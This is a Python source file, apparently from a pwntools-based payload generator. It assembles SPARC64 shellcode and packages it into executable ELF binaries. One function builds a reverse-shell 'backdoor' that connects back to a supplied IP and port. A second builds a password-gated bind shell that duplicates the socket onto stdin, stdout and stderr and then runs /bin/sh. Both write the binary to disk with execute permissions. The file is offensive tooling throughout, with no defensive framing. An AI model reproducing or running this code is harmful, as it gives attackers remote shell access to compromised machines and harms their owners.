from pwn import *
'''
11.17 add sparc32 ,powerpc don't exam
socket 0xce
connect 0x62
dup2  0x5A
execve  0x3B
bind
listen
add 11.24 sparc64_big_backdoor
'''
from colorama import Fore,Back,Style
from . import extract_shellcode
from . import my_package

def sparc64_backdoor(reverse_ip ,reverse_port, filename = None):
    context.arch = 'sparc64'
    context.endian = 'big'
    context.bits = '64'
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_ip = reverse_ip.split('.')
    reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
    reverse_ip_2 = "0x"+enhex(p8(int(reverse_ip[1])))
    reverse_ip_3 = "0x"+enhex(p8(int(reverse_ip[2])))
    reverse_ip_4 = "0x"+enhex(p8(int(reverse_ip[3])))
    handle_port = hex(p16(reverse_port)[0])
    handle_port_1 = hex(p16(reverse_port)[1])
    shellcode = '''
    mov  0, %o2
    mov  1, %o1
    mov  2, %o0
    save   %sp,  -208,  %sp
    stx    %g1,  [ %fp + 0x7f7 ]
    clr    %g1
    mov    1,  %o0
    stx    %i0,  [ %fp + 0x7df ]
    stx    %i1,  [ %fp + 0x7e7 ]
    stx    %i2,  [ %fp + 0x7ef ]
    add    %fp,  0x7df,  %o1
    mov  0xce, %g1
    ta   0x10
    mov  %o0, %l0
    mov  {} , %g1 
    stb   %g1 , [%sp + 4 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 5 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 6 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 7 ]
    mov  0 ,  %g1
    stb  %g1,   [%sp]
    mov  2,   %g1
    stb  %g1,   [%sp+1]
    mov   {}, %g1
    stb   %g1,  [%sp + 2]
    mov   {}, %g1
    stb   %g1,  [%sp + 3]
    mov  %sp, %o1
    mov  0x10,%o2
    mov  0x62,%g1
    ta   0x10
    mov  %l0, %o0
    mov  0,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  1,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  2,  %o2
    mov  0x5a, %g1
    ta   0x10
    sethi  0xbd89a, %g2
    or     %g2, 0x16e, %g2
    sethi  %hi(0x2f736800), %g3
    st     %g2, [%sp + 0x20]
    st   %g3, [%sp + 0x24]
    mov  0,  %g3
    add  %sp, 0x20, %g1
    mov  %g1, %o0
    stx   %g1, [%sp]
    stx   %g3, [%sp +8]
    mov  %sp, %o1
    mov  %g3, %o2
    mov  0x3b, %g1
    ta   0x10
    '''
    shellcode = asm(shellcode.format(reverse_ip_1, reverse_ip_2, reverse_ip_3, reverse_ip_4, handle_port, handle_port_1))
    ELF_data = make_elf(shellcode)
    if(filename==None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
        f=open(filename,"wb")
        f.write(ELF_data)
        f.close()
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            f=open(filename,"wb")
            f.write(ELF_data)
            f.close()
            os.chmod(filename, 0o755)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                f=open(filename,"wb")
                f.write(ELF_data)
                f.close()
                os.chmod(filename, 0o755)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
            else:
                return  

'''
12.18 sparc64 bind shell
socket 0xce
connect 0x62
dup2  0x5A
execve  0x3B
bind
listen
add 11.24 sparc64_big_backdoor
'''


def sparc64_bind_shell(bindport, passwd, filename=None):
    context.arch = 'sparc64'
    context.endian = 'big'
    context.bits = '64'
    log.success("bind_port is: "+ str(bindport))
    log.success("reverse_port is: "+str(passwd))
    handle_port = hex(p16(bindport)[0])
    handle_port_1 = hex(p16(bindport)[1])
    passwd_len = len(passwd)
    passwd = '0x'+enhex(passwd.encode())
    passwd = passwd.ljust(10,'0')
    shellcode = '''
    mov  0, %o2
    mov  1, %o1
    mov  2, %o0
    save   %sp,  -208,  %sp
    stx    %g1,  [ %fp + 0x7f7 ]
    clr    %g1
    mov    1,  %o0
    stx    %i0,  [ %fp + 0x7df ]
    stx    %i1,  [ %fp + 0x7e7 ]
    stx    %i2,  [ %fp + 0x7ef ]
    add    %fp,  0x7df,  %o1
    mov  0xce, %g1
    ta   0x10
    mov  %o0, %l0
    mov  0 , %g1 
    st   %g1 , [%sp + 4 ]
    mov  0 ,  %g1
    stb  %g1,   [%sp]
    mov  2,   %g1
    stb  %g1,   [%sp+1]
    mov   {}, %g1
    stb   %g1,  [%sp + 2]
    mov   {}, %g1
    stb   %g1,  [%sp + 3]
    mov  %sp, %o1
    mov  0x10, %o2
    stx   %o0,   [%sp-0x38]
    stx   %o1,  [%sp-0x30]
    stx   %o2,  [%sp-0x28]
    sub  %o1, 0x38, %o1    
    mov  2,%o0
    mov  0xce,%g1
    ta   0x10
    mov  0,  %o2
    stx  %o2,   [%sp-0x30]
    stx  %o2,   [%sp-0x28]
    mov  0,  %o3
    mov  3,  %o4
    mov  4,   %o0
    ta   0x10
    mov  0x63, %g1
    mov  %l0, %o0
    mov  0,  %o1
    mov  0, %o2
    ta  0x10
    mov  %o0, %l0
    mov  %l0, %o0
    mov  0,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  1,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  2,  %o2
    mov  0x5a, %g1
    ta   0x10
    set  0x50617373, %g2
    set  0x77643A00, %g3
    std  %g2, [%sp+64]
    mov  1,  %o0
    add  %sp, 64, %o1
    mov  8,  %o2
    mov  4,  %g1
    ta   0x10
    mov  0, %o0
    add  %sp, 88, %o1
    mov  {}, %o2
    mov   3, %g1
    ta   0x10
    set  {}, %l4
    ld   [%sp +88], %o7
    cmp  %o7, %l4
    '''

    shellcode_execve = '''
    sethi  0xbd89a, %g2
    or     %g2, 0x16e, %g2
    sethi  %hi(0x2f736800), %g3
    st     %g2, [%sp + 0x20]
    st   %g3, [%sp + 0x24]
    mov  0,  %g3
    add  %sp, 0x20, %g1
    mov  %g1, %o0
    stx   %g1, [%sp]
    stx   %g3, [%sp +8]
    mov  %sp, %o1
    mov  %g3, %o2
    mov  0x3b, %g1
    ta   0x10
    '''
    shellcode = asm(shellcode.format(handle_port, handle_port_1, passwd_len, passwd))
    shellcode += b'\x12\x68\x00\x06\x01\x00\x00\x00'
    shellcode += asm(shellcode_execve)
    ELF_data = make_elf(shellcode)
    if(filename==None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,my_package.chars)
        f=open(filename,"wb")
        f.write(ELF_data)
        f.close()
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            f=open(filename,"wb")
            f.write(ELF_data)
            f.close()
            os.chmod(filename, 0o755)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                f=open(filename,"wb")
                f.write(ELF_data)
                f.close()
                os.chmod(filename, 0o755)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
            else:
                return  


def sparc64_reverse_sl(reverse_ip, reverse_port, filename = None):
    pass